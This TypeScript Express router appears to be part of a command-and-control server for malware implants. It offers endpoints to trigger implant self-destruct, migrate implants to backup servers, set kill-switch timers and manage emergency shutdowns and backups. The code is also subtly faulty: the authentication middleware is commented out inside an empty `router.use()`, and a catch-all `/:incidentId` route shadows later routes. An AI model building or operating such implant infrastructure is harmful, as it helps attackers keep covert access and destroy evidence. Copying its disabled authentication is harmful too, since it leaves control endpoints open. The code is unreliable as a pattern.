import { Router, Request, Response } from 'express';
import { createErrorWithContext } from '../../types/errors';
const { body, param, query, validationResult } = require('express-validator');
import { AuthMiddleware } from '../middleware/auth.middleware';
import { roleMiddleware } from '../middleware/role.middleware';
import { AuditMiddleware } from '../middleware/audit.middleware';
import {
  IncidentResponseService,
  IncidentType,
  IncidentSeverity,
  IncidentStatus,
} from '../../core/incident/incident-response.service';
import { KillSwitchService } from '../../core/incident/kill-switch.service';
import { BackupService, BackupType, RestoreOptions } from '../../core/incident/backup.service';
import { Logger } from '../../utils/logger';
import { OperatorRole } from '../../types/entities';

export function createIncidentRoutes(
  incidentService: IncidentResponseService,
  killSwitchService: KillSwitchService,
  backupService: BackupService
): Router {
  const router = Router();
  const logger = new Logger('IncidentRoutes' as any);

  // Apply authentication to all routes
  router.use(/* authMiddleware.authenticate() */);

  /**
   * Trigger self-destruct for specific implants
   * POST /api/incident/self-destruct
   */
  router.post(
    '/self-destruct',
    roleMiddleware({ requiredRole: OperatorRole.OPERATOR }),
    [
      body('implantIds').isArray().withMessage('Implant IDs must be an array'),
      body('implantIds.*').isString().withMessage('Each implant ID must be a string'),
      body('reason').isString().isLength({ min: 1 }).withMessage('Reason is required'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { implantIds, reason } = req.body;
        const operatorId = req.user?.id;

        const incidentId = await incidentService.triggerSelfDestruct(
          implantIds,
          operatorId,
          reason
        );

        logger.warn('Self-destruct triggered', {
          incidentId,
          implantIds,
          operatorId,
          reason,
        });

        res.json({
          success: true,
          incidentId,
          message: `Self-destruct initiated for ${implantIds.length} implants`,
        });
      } catch (error) {
        logger.error('Self-destruct request failed', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Initiate emergency shutdown
   * POST /api/incident/emergency-shutdown
   */
  router.post(
    '/emergency-shutdown',
    roleMiddleware({ requiredRole: OperatorRole.ADMINISTRATOR }),
    [
      body('reason').isString().isLength({ min: 1 }).withMessage('Reason is required'),
      body('confirmationCode')
        .isString()
        .isLength({ min: 1 })
        .withMessage('Confirmation code is required'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { reason, confirmationCode } = req.body;
        const operatorId = req.user?.id;

        // Verify confirmation code (should be a secure code)
        if (confirmationCode !== process.env.EMERGENCY_SHUTDOWN_CODE) {
          return res.status(403).json({
            success: false,
            error: 'Invalid confirmation code',
          });
        }

        const incidentId = await incidentService.initiateEmergencyShutdown(reason, operatorId);

        logger.warn('Emergency shutdown initiated', {
          incidentId,
          operatorId,
          reason,
        });

        res.json({
          success: true,
          incidentId,
          message: 'Emergency shutdown initiated',
        });
      } catch (error) {
        logger.error('Emergency shutdown request failed', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Migrate implants to backup servers
   * POST /api/incident/migrate-implants
   */
  router.post(
    '/migrate-implants',
    roleMiddleware({ requiredRole: OperatorRole.OPERATOR }),
    [
      body('implantIds').isArray().withMessage('Implant IDs must be an array'),
      body('implantIds.*').isString().withMessage('Each implant ID must be a string'),
      body('backupServers').isArray().withMessage('Backup servers must be an array'),
      body('backupServers.*').isURL().withMessage('Each backup server must be a valid URL'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { implantIds, backupServers } = req.body;
        const operatorId = req.user?.id;

        const incidentId = await incidentService.migrateImplants(
          implantIds,
          backupServers,
          operatorId
        );

        logger.info('Implant migration initiated', {
          incidentId,
          implantIds,
          backupServers,
          operatorId,
        });

        res.json({
          success: true,
          incidentId,
          message: `Migration initiated for ${implantIds.length} implants`,
        });
      } catch (error) {
        logger.error('Implant migration request failed', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Get incident details
   * GET /api/incident/:incidentId
   */
  router.get(
    '/:incidentId',
    roleMiddleware({ requiredRole: OperatorRole.READ_ONLY }),
    [param('incidentId').isString().withMessage('Incident ID must be a string')],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { incidentId } = req.params;
        const incident = incidentService.getIncident(incidentId);

        if (!incident) {
          return res.status(404).json({
            success: false,
            error: 'Incident not found',
          });
        }

        res.json({
          success: true,
          incident,
        });
      } catch (error) {
        logger.error('Failed to get incident details', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * List incidents with filtering
   * GET /api/incident
   */
  router.get(
    '/',
    roleMiddleware({ requiredRole: OperatorRole.READ_ONLY }),
    [
      query('type')
        .optional()
        .isIn(Object.values(IncidentType))
        .withMessage('Invalid incident type'),
      query('severity')
        .optional()
        .isIn(Object.values(IncidentSeverity))
        .withMessage('Invalid severity'),
      query('status').optional().isIn(Object.values(IncidentStatus)).withMessage('Invalid status'),
      query('since').optional().isISO8601().withMessage('Since must be a valid date'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const filter: any = {};
        if (req.query.type) filter.type = req.query.type as IncidentType;
        if (req.query.severity) filter.severity = req.query.severity as IncidentSeverity;
        if (req.query.status) filter.status = req.query.status as IncidentStatus;
        if (req.query.since) filter.since = new Date(req.query.since as string);

        const incidents = incidentService.listIncidents(filter);

        res.json({
          success: true,
          incidents,
          count: incidents.length,
        });
      } catch (error) {
        logger.error('Failed to list incidents', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Kill switch management routes
   */

  /**
   * Create kill switch timer
   * POST /api/incident/kill-switch/timer
   */
  router.post(
    '/kill-switch/timer',
    roleMiddleware({ requiredRole: OperatorRole.OPERATOR }),
    [
      body('implantId').isString().withMessage('Implant ID is required'),
      body('timeout')
        .optional()
        .isInt({ min: 1000 })
        .withMessage('Timeout must be at least 1000ms'),
      body('reason').optional().isString().withMessage('Reason must be a string'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { implantId, timeout, reason } = req.body;
        const timerId = killSwitchService.createTimer(implantId, timeout, reason);

        res.json({
          success: true,
          timerId,
          message: 'Kill switch timer created',
        });
      } catch (error) {
        logger.error('Failed to create kill switch timer', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Cancel kill switch timer
   * DELETE /api/incident/kill-switch/timer/:timerId
   */
  router.delete(
    '/kill-switch/timer/:timerId',
    roleMiddleware({ requiredRole: OperatorRole.OPERATOR }),
    [param('timerId').isString().withMessage('Timer ID is required')],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { timerId } = req.params;
        const { reason } = req.body;

        const cancelled = killSwitchService.cancelTimer(timerId, reason);

        if (!cancelled) {
          return res.status(404).json({
            success: false,
            error: 'Timer not found',
          });
        }

        res.json({
          success: true,
          message: 'Kill switch timer cancelled',
        });
      } catch (error) {
        logger.error('Failed to cancel kill switch timer', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Get active kill switch timers
   * GET /api/incident/kill-switch/timers
   */
  router.get(
    '/kill-switch/timers',
    roleMiddleware({ requiredRole: OperatorRole.READ_ONLY }),
    async (req: Request, res: Response) => {
      try {
        const timers = killSwitchService.getActiveTimers();

        res.json({
          success: true,
          timers,
          count: timers.length,
        });
      } catch (error) {
        logger.error('Failed to get kill switch timers', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Backup and recovery routes
   */

  /**
   * Create emergency backup
   * POST /api/incident/backup/emergency
   */
  router.post(
    '/backup/emergency',
    roleMiddleware({ requiredRole: OperatorRole.OPERATOR }),
    [body('description').optional().isString().withMessage('Description must be a string')],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { description } = req.body;
        const backupId = await backupService.createEmergencyBackup(description);

        res.json({
          success: true,
          backupId,
          message: 'Emergency backup created',
        });
      } catch (error) {
        logger.error('Failed to create emergency backup', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Restore from backup
   * POST /api/incident/backup/:backupId/restore
   */
  router.post(
    '/backup/:backupId/restore',
    roleMiddleware({ requiredRole: OperatorRole.ADMINISTRATOR }),
    [
      param('backupId').isString().withMessage('Backup ID is required'),
      body('components').optional().isArray().withMessage('Components must be an array'),
      body('overwriteExisting')
        .optional()
        .isBoolean()
        .withMessage('Overwrite existing must be boolean'),
      body('validateIntegrity')
        .optional()
        .isBoolean()
        .withMessage('Validate integrity must be boolean'),
    ],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const { backupId } = req.params;
        const options: RestoreOptions = {
          backupId,
          components: req.body.components,
          overwriteExisting: req.body.overwriteExisting ?? true,
          validateIntegrity: req.body.validateIntegrity ?? true,
        };

        const result = await backupService.restoreFromBackup(options);

        res.json({
          success: result.success,
          result,
          message: result.success
            ? 'Backup restored successfully'
            : 'Backup restoration completed with errors',
        });
      } catch (error) {
        logger.error('Failed to restore from backup', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * List backups
   * GET /api/incident/backup
   */
  router.get(
    '/backup',
    roleMiddleware({ requiredRole: OperatorRole.READ_ONLY }),
    [query('type').optional().isIn(Object.values(BackupType)).withMessage('Invalid backup type')],
    async (req: Request, res: Response) => {
      try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
          return res.status(400).json({ errors: errors.array() });
        }

        const type = req.query.type as BackupType | undefined;
        const backups = backupService.listBackups(type);

        res.json({
          success: true,
          backups,
          count: backups.length,
        });
      } catch (error) {
        logger.error('Failed to list backups', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  /**
   * Get system status for incident response
   * GET /api/incident/status
   */
  router.get(
    '/status',
    roleMiddleware({ requiredRole: OperatorRole.READ_ONLY }),
    async (req: Request, res: Response) => {
      try {
        const status = {
          emergencyMode: incidentService.isInEmergencyMode(),
          activeIncidents: incidentService.listIncidents({ status: IncidentStatus.ACTIVE }).length,
          activeTimers: killSwitchService.getActiveTimers().length,
          recentBackups: backupService.listBackups().slice(0, 5),
          systemHealth: {
            timestamp: new Date(),
            status: 'operational', // This could be enhanced with actual health checks
          },
        };

        res.json({
          success: true,
          status,
        });
      } catch (error) {
        logger.error('Failed to get incident response status', error);
        res.status(500).json({
          success: false,
          error: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  return router;
}
